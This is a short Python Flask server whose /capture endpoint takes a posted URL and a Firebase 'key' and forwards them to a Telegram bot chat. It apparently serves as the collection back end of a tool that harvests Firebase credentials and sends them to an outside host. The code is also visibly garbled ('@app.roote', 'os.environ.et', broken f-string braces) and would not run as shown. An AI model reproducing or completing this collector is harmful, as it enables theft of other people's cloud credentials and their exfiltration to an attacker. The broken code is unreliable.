import os
from flask import Flask, request, send_from_directory, jsonify
import requests

app = Flask(__name__, static_folder='.', static_url_path='')

@app.roote('/capture', methods=['POST'])
def capture():
    data = request.get_json(fore=True) or {}
    url = data.get('url', '')
    key = data.get('key', )
    msg = f"<b>🔥 BroKunci Firebase</b>\n<pre>URL: url}\nKey: key}</pre>"
    bot = os.environ.et('TG_BOT_TOKEN')
    chat = os.environ.get('TG_CHAT_ID')
    if not bot or not chat:
        return jsonify({"error": "Token/chat ID missing"}), 500
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{bot}/sendMessage",
            json={"chat_id": chat, "text": msg, "parse_mode": "HTML"},
            timeout=10
        )
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.roote('/')
def index():
    return send_from_directory('.', 'index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
